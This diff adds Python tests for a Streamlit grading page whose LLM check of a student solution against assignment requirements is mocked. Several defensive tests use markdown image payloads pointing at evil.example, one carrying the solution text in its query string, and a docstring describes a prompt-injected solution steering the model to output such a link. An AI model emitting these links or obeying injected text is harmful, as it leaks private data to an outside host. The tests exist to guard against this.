@@ -1,0 +1,424 @@
+#  Copyright (c) 2026. Christopher Queen Consulting LLC (http://www.ChristopherQueenConsulting.com/)
+"""AppTest: the requirement checklist under the solution uploader (PR 9).
+
+The model is replaced everywhere; the page itself runs for real. Synthetic text only.
+"""
+
+from contextlib import ExitStack
+from unittest.mock import AsyncMock, patch
+
+import pytest
+from streamlit.testing.v1 import AppTest
+
+from cqc_cpcc import requirement_coverage as rc
+from cqc_cpcc import requirement_solution_check as rsc
+from cqc_streamlit_app.grade_assignment import PROVIDER_SENTENCE, SOLUTION_CHECK_FAILED, TABLE_HELP
+
+pytestmark = pytest.mark.unit
+
+INSTRUCTIONS = "Write OrderTotal.java that reads a price, applies a discount and prints the total."
+SOLUTION = "public class OrderTotal { /* reads and prints, no discount */ }"
+EXTRACTED = rc.RequirementChecklist(requirements=[
+    rc.RequirementItem(id="R1", text="Reads a price", weight="core"),
+    rc.RequirementItem(id="R2", text="Applies a discount", weight="core"),
+    rc.RequirementItem(id="R3", text="Prints the total", weight="secondary")])
+
+
+def _page():
+    import streamlit as st
+
+    from cqc_streamlit_app.grade_assignment import render_requirement_checklist
+    st.session_state["out"] = render_requirement_checklist(
+        "Write OrderTotal.java that reads a price, applies a discount and prints the total.",
+        "source-1", st.session_state.get("solution_text"))
+
+
+def _verdicts(**statuses):
+    return rsc.SolutionCheck(verdicts=[
+        rsc.SolutionVerdict(requirement_id=k.upper(), does_it=v, evidence=f"evidence {k}")
+        for k, v in statuses.items()])
+
+
+class Page:
+    """An AppTest with the model and the policy replaced."""
+
+    def __init__(self, *, check=None, calibrated=False):
+        self.check = check or AsyncMock(return_value=_verdicts(r1="yes", r2="no", r3="yes"))
+        self.calibrated = calibrated
+        self.at = AppTest.from_function(_page, default_timeout=30)
+        rsc.clear_cache()
+
+    def run(self):
+        with ExitStack() as stack:
+            stack.enter_context(patch("cqc_streamlit_app.grade_assignment.extract_requirements",
+                                      new=AsyncMock(return_value=EXTRACTED.model_copy(deep=True))))
+            stack.enter_context(patch.object(rsc, "check_requirements_against_solution", new=self.check))
+            stack.enter_context(patch.object(rsc, "policy_floor_met", return_value=self.calibrated))
+            self.at.run()
+        assert not self.at.exception, self.at.exception
+        return self
+
+    def click(self, label, editor_state=None):
+        """Click a button. AppTest keeps no state for data_editor, so a test that edited the table
+        passes the same edits again for the run the click starts."""
+        button = next(b for b in self.at.button if b.label == label)
+        for key, value in (editor_state or {}).items():
+            self.at.session_state[key] = value
+        with ExitStack() as stack:
+            stack.enter_context(patch.object(rsc, "check_requirements_against_solution", new=self.check))
+            stack.enter_context(patch.object(rsc, "policy_floor_met", return_value=self.calibrated))
+            button.click().run()
+        assert not self.at.exception, self.at.exception
+        return self
+
+    @property
+    def out(self):
+        return self.at.session_state["out"]
+
+    @property
+    def labels(self):
+        return [b.label for b in self.at.button]
+
+    @property
+    def captions(self):
+        return [c.value for c in self.at.caption]
+
+
+def test_without_a_solution_the_check_button_is_off_and_says_why():
+    page = Page().run()
+    button = next(b for b in page.at.button if b.label == "Check all against the solution")
+    assert button.disabled
+    assert any("off because there is no solution yet" in c for c in page.captions)
+    page.check.assert_not_awaited()
+    assert [r.graded for r in page.out.requirements] == [True, True, True]
+
+
+def test_no_widget_has_an_empty_label():
+    page = Page()
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    assert all(b.label.strip() for b in page.at.button)
+    assert all(t.label.strip() for t in page.at.toggle)
+
+
+def test_a_solution_runs_the_check_once_and_a_no_is_only_a_suggestion_before_calibration():
+    page = Page()
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    assert page.check.await_count == 1
+    assert [r.solution_status for r in page.out.requirements] == ["yes", "no", "yes"]
+    assert [r.graded for r in page.out.requirements] == [True, True, True]
+    assert any("The check suggests your solution does not do: R2" in i.value for i in page.at.info)
+    assert any("only suggests" in c for c in page.captions)
+    assert "Stop grading the suggested requirements (R2)" in page.labels
+
+    page.click("Stop grading the suggested requirements (R2)")
+    assert [r.graded for r in page.out.requirements] == [True, False, True]
+    assert page.check.await_count == 1  # applying a suggestion is not a new call
+    assert "Stop grading the suggested requirements (R2)" not in page.labels
+    assert any(c.startswith("Not graded") and "R2 Applies a discount" in c for c in page.captions)
+
+
+def test_after_calibration_a_no_is_applied_without_a_click():
+    page = Page(calibrated=True)
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    assert [r.graded for r in page.out.requirements] == [True, False, True]
+    assert any(c.startswith("Not graded") for c in page.captions)  # visible, not collapsed
+    assert not any("only suggests" in c for c in page.captions)
+
+
+def test_an_unclear_answer_stays_graded_and_is_explained():
+    page = Page(check=AsyncMock(return_value=_verdicts(r1="yes", r2="unclear", r3="yes")), calibrated=True)
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    assert [r.graded for r in page.out.requirements] == [True, True, True]
+    assert any("could not tell for R2" in c for c in page.captions)
+
+
+def test_a_failed_check_leaves_everything_graded_and_offers_a_retry():
+    page = Page(check=AsyncMock(side_effect=RuntimeError("model unavailable")))
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    assert [r.graded for r in page.out.requirements] == [True, True, True]
+    assert any(w.value == SOLUTION_CHECK_FAILED for w in page.at.warning)
+    assert page.check.await_count == 1  # no retry loop on its own
+    page.check.side_effect = None
+    page.check.return_value = _verdicts(r1="yes", r2="no", r3="yes")
+    page.click("Try the check again")
+    assert page.check.await_count == 2
+    assert [r.solution_status for r in page.out.requirements] == ["yes", "no", "yes"]
+
+
+def test_removing_the_solution_clears_the_check():
+    page = Page(calibrated=True)
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    assert not page.out.requirements[1].graded
+    page.at.session_state["solution_text"] = None
+    page.run()
+    assert all(r.graded and r.solution_status is None for r in page.out.requirements)
+
+
+def test_a_new_solution_is_checked_again_and_the_same_one_is_not():
+    page = Page()
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run().run()
+    assert page.check.await_count == 1
+    page.at.session_state["solution_text"] = SOLUTION + "\n// second version"
+    page.run()
+    assert page.check.await_count == 2
+
+
+def test_the_manual_check_button_asks_again():
+    page = Page()
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    page.click("Check all against the solution")
+    assert page.check.await_count == 2
+
+
+def test_an_edited_row_shows_a_recheck_button_that_updates_only_that_row():
+    page = Page()
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    assert not any(label.startswith("Re-check") for label in page.labels)
+    key = rc.instructions_hash("source-1")
+    editor_key = f"requirements_editor_{key[:12]}_{page.at.session_state['requirement_editor_generation'][key]}"
+    edits = {editor_key: {"edited_rows": {1: {"text": "Applies a ten percent discount"}},
+                          "added_rows": [], "deleted_rows": []}}
+    page.at.session_state[editor_key] = edits[editor_key]
+    page.check.return_value = _verdicts(r1="no", r2="yes", r3="no")
+    page.run()
+    assert "Re-check R2" in page.labels and "Re-check R1" not in page.labels
+    assert page.out.requirements[1].text == "Applies a ten percent discount"
+    assert page.out.requirements[1].solution_status is None  # the old verdict was for the old text
+    page.click("Re-check R2", editor_state=edits)
+    statuses = {r.id: r.solution_status for r in page.out.requirements}
+    assert statuses == {"R1": "yes", "R2": "yes", "R3": "yes"}  # R1 and R3 keep the earlier answer
+    texts = [c.args[1].requirements[1].text for c in page.check.await_args_list[-1:]]
+    assert texts == ["Applies a ten percent discount"]
+
+
+def test_a_failed_check_never_logs_or_shows_the_solution(caplog):
+    page = Page(check=AsyncMock(side_effect=Exception("SECRET_SOLUTION_TEXT")))
+    page.at.session_state["solution_text"] = SOLUTION
+    with caplog.at_level("DEBUG"):
+        page.run()
+    shown = " ".join([w.value for w in page.at.warning] + page.captions + [e.value for e in page.at.error])
+    assert "SECRET_SOLUTION_TEXT" not in shown
+    assert "SECRET_SOLUTION_TEXT" not in caplog.text and "SECRET_SOLUTION_TEXT" not in str(
+        [r.exc_info for r in caplog.records])
+    assert "Exception" in caplog.text  # the type is logged
+
+
+def test_a_failed_extraction_shows_a_fixed_sentence():
+    page = Page()
+    with patch("cqc_streamlit_app.grade_assignment.extract_requirements",
+               new=AsyncMock(side_effect=Exception("SECRET_INSTRUCTIONS"))):
+        page.at.run()
+    assert [e.value for e in page.at.error] == [
+        "The requirements could not be read from the instructions. Press Try again, or check that "
+        "the instructions loaded."]
+
+
+def test_the_page_explains_the_columns_the_cost_and_who_gets_the_text():
+    page = Page()
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    captions = page.captions
+    assert TABLE_HELP in captions
+    assert "Table of requirements. Edit the text and weight here." in captions
+    assert any(c.startswith("Estimated cost: ") and PROVIDER_SENTENCE in c for c in captions)
+    assert "Solution check: R1 Yes; R2 No; R3 Yes" in captions
+    assert any(c.startswith("R2: evidence r2") or c == "R2: evidence r2" for c in captions)  # why, per row
+
+
+def test_requirements_to_grade_is_a_list_a_screen_reader_can_use():
+    page = Page(calibrated=True)
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    box = next(m for m in page.at.multiselect if m.label == "Requirements to grade (remove one to stop grading it)")
+    assert box.value == ["R1", "R3"] and len(box.options) == 3
+    assert box.options[1].startswith("R2: Applies a discount")
+    box.set_value(["R1"])
+    page.run()
+    assert [r.graded for r in page.out.requirements] == [True, False, False]
+
+
+def test_earlier_results_with_another_checklist_are_called_out():
+    page = Page()
+    old = rc.RequirementChecklist(requirements=[rc.RequirementItem(id="R1", text="Old", weight="core")])
+    page.at.session_state["grading_inputs_by_key"] = {"k": {"kwargs": {
+        "assignment_instructions": "Write OrderTotal.java that reads a price, applies a discount and prints the total.",
+        "requirements": old}}}
+    page.at.session_state["grading_results_by_key"] = {"k": [("a", object()), ("b", object())]}
+    page.run()
+    assert "2 earlier results used a different checklist; regrade for a consistent section." in page.captions
+
+
+GRADED_BOX = "Requirements to grade (remove one to stop grading it)"
+
+
+def _edit(page, edits):
+    key = rc.instructions_hash("source-1")
+    editor_key = f"requirements_editor_{key[:12]}_{page.at.session_state['requirement_editor_generation'][key]}"
+    page.at.session_state[editor_key] = edits
+    return {editor_key: edits}
+
+
+def test_model_text_is_not_rendered_as_markdown():
+    """A prompt-injected solution can make the model answer with an image link that the browser
+    would fetch. Evidence and requirement text are shown inert."""
+    evil = "![x](http://evil.example/a.png?q=SOLUTION)"
+    answer = rsc.SolutionCheck(verdicts=[
+        rsc.SolutionVerdict(requirement_id="R1", does_it="yes", evidence="ok"),
+        rsc.SolutionVerdict(requirement_id="R2", does_it="no", evidence=evil),
+        rsc.SolutionVerdict(requirement_id="R3", does_it="yes", evidence="ok")])
+    page = Page(check=AsyncMock(return_value=answer), calibrated=False)
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    shown = [c for c in page.captions if c.startswith("R2:")]
+    assert shown and all("![" not in c and "](" not in c for c in shown)
+    assert not page.at.get("imgs")
+
+
+def test_no_instruction_names_a_graded_column_or_tick_box():
+    import inspect
+
+    from cqc_streamlit_app import grade_assignment as ga
+
+    source = inspect.getsource(ga._render_solution_check) + ga.TABLE_HELP + ga.SOLUTION_CHECK_FAILED
+    assert "untick" not in source.lower() and "tick graded" not in source.lower()
+    assert "Requirements to grade" in ga.TABLE_HELP and "Requirements to grade" in ga.SOLUTION_CHECK_FAILED
+
+
+def test_a_removed_requirement_stays_removed_when_another_row_is_edited_or_added():
+    page = Page()
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    next(m for m in page.at.multiselect if m.label == GRADED_BOX).set_value(["R1", "R3"]).run()
+    assert [r.graded for r in page.out.requirements] == [True, False, True]
+    assert [r.hand_ungraded for r in page.out.requirements] == [False, True, False]
+
+    _edit(page, {"edited_rows": {0: {"text": "Reads a price and a quantity"}},
+                 "added_rows": [], "deleted_rows": []})
+    page.run()
+    assert [r.graded for r in page.out.requirements] == [True, False, True]
+    assert page.out.requirements[0].text == "Reads a price and a quantity"
+
+    _edit(page, {"edited_rows": {}, "added_rows": [{"text": "Prints a banner", "weight": "core"}],
+                 "deleted_rows": []})
+    page.run()
+    assert [r.id for r in page.out.requirements] == ["R1", "R2", "R3", "R4"]
+    assert [r.graded for r in page.out.requirements] == [True, False, True, True]
+    assert page.out.requirements[0].text == "Reads a price"
+
+
+def test_a_requirement_the_instructor_removed_is_not_put_back_by_a_recheck():
+    page = Page()  # not calibrated: the "no" for R2 is only a suggestion
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    next(m for m in page.at.multiselect if m.label == GRADED_BOX).set_value(["R1", "R3"]).run()
+    page.check.return_value = _verdicts(r1="yes", r2="yes", r3="yes")
+    page.click("Check all against the solution")
+    assert [r.solution_status for r in page.out.requirements] == ["yes", "yes", "yes"]
+    assert [r.graded for r in page.out.requirements] == [True, False, True]
+
+
+def test_a_long_instruction_text_says_the_check_read_only_the_start():
+    page = Page()
+    page.at.session_state["solution_text"] = SOLUTION
+    with patch.object(rsc, "MAX_INSTRUCTIONS_CHARS", 20):
+        page.run()
+    assert "The check read only the first 20 characters of the instructions." in page.captions
+
+
+def test_a_gateway_error_never_reaches_the_log_or_the_page(caplog):
+    real = rsc.check_requirements_against_solution
+    page = Page(check=real)
+    page.at.session_state["solution_text"] = SOLUTION
+    with patch("cqc_cpcc.utilities.AI.llm_gateway.structured",
+               new=AsyncMock(side_effect=Exception("SECRET_FROM_GATEWAY"))), caplog.at_level("DEBUG"):
+        page.run()
+    shown = " ".join([w.value for w in page.at.warning] + page.captions)
+    assert "SECRET_FROM_GATEWAY" not in shown and "SECRET_FROM_GATEWAY" not in caplog.text
+    assert any(w.value == SOLUTION_CHECK_FAILED for w in page.at.warning)
+
+
+def test_the_reason_a_button_is_off_comes_before_the_button():
+    page = Page().run()
+    flat = " ".join(e.label if e.type == "button" else e.value for e in page.at.main
+                     if e.type in ("button", "caption"))
+    assert flat.index("The next button is off because there is no solution yet.") < flat.index(
+        "Check all against the solution")
+
+
+def test_a_hostile_id_and_text_never_reach_a_label_or_caption():
+    evil_id, evil_text = "![x](http://evil.example/a.png)", "![x](http://evil.example/b.png)"
+    page = Page(check=AsyncMock(return_value=_verdicts(r1="no", r2="no", r3="yes")))
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    edits = {"edited_rows": {0: {"id": evil_id, "text": evil_text}}, "added_rows": [], "deleted_rows": []}
+    _edit(page, edits)
+    page.run()
+    assert page.out.requirements[0].id == "R4"  # replaced by the next free safe id
+    page.click("Check all against the solution", editor_state=_edit(page, edits))
+    shown = ([b.label for b in page.at.button] + page.captions + [i.value for i in page.at.info]
+             + [w.value for w in page.at.warning])
+    for m in page.at.multiselect:
+        shown += [str(o) for o in m.options] + [str(v) for v in m.value]
+    assert shown and all("![" not in t and "](" not in t for t in shown), [t for t in shown if "![" in t]
+
+
+def test_a_duplicate_id_inherits_nothing_from_the_first_owner():
+    from cqc_streamlit_app.grade_assignment import _checklist_from_editor
+    import pandas as pd
+
+    base = rc.RequirementChecklist(requirements=[
+        rc.RequirementItem(id="R1", text="a", weight="core"),
+        rc.RequirementItem(id="R2", text="Applies a discount", weight="core", graded=False, hand_ungraded=True)])
+    frame = pd.DataFrame([
+        {"id": "R2", "text": "Applies a discount", "weight": "core"},
+        {"id": "r2", "text": "A second row typed with the same id", "weight": "core"}])
+    out = _checklist_from_editor(frame, base).requirements
+    assert [r.id for r in out] == ["R2", "R3"]
+    assert (out[0].graded, out[0].hand_ungraded) == (False, True)
+    assert (out[1].graded, out[1].hand_ungraded) == (True, False)
+
+
+def test_an_unsafe_id_row_never_inherits_and_the_real_row_keeps_its_id_and_state():
+    import pandas as pd
+
+    from cqc_streamlit_app.grade_assignment import _checklist_from_editor
+
+    base = rc.RequirementChecklist(requirements=[
+        rc.RequirementItem(id="R1", text="one", weight="core", graded=False, hand_ungraded=True),
+        rc.RequirementItem(id="R2", text="two", weight="core"),
+        rc.RequirementItem(id="R3", text="three", weight="core", graded=False, hand_ungraded=True)])
+    for unsafe in ("R 1", "R1​", "![x](http://evil/a.png)", "R" + "1" * 20):
+        frame = pd.DataFrame([
+            {"id": unsafe, "text": "typed row", "weight": "core"},
+            {"id": "R1", "text": "one", "weight": "core"},
+            {"id": "R3", "text": "three", "weight": "core"}])
+        out = {r.text: r for r in _checklist_from_editor(frame, base).requirements}
+        assert (out["typed row"].graded, out["typed row"].hand_ungraded) == (True, False), unsafe
+        assert out["typed row"].id not in ("R1", "R2", "R3")  # a free id: R2 is a base id too
+        assert out["one"].id == "R1" and (out["one"].graded, out["one"].hand_ungraded) == (False, True)
+        assert out["three"].id == "R3" and (out["three"].graded, out["three"].hand_ungraded) == (False, True)
+
+
+def test_ids_with_underscore_or_dash_render_escaped():
+    answer = _verdicts(r1="yes", r2="unclear", r3="yes")
+    page = Page(check=AsyncMock(return_value=answer))
+    page.at.session_state["solution_text"] = SOLUTION
+    page.run()
+    edits = {"edited_rows": {1: {"id": "r_2-x"}}, "added_rows": [], "deleted_rows": []}
+    _edit(page, edits)
+    page.run()
+    assert page.out.requirements[1].id == "R_2-X"
+    page.check.return_value = rsc.SolutionCheck(verdicts=[
+        rsc.SolutionVerdict(requirement_id="R_2-X", does_it="unclear", evidence="e")])
+    page.click("Check all against the solution", editor_state=_edit(page, edits))
+    text = " ".join(page.captions)
+    assert "R\\_2-X" in text and "R_2-X" not in text.replace("R\\_2-X", "")
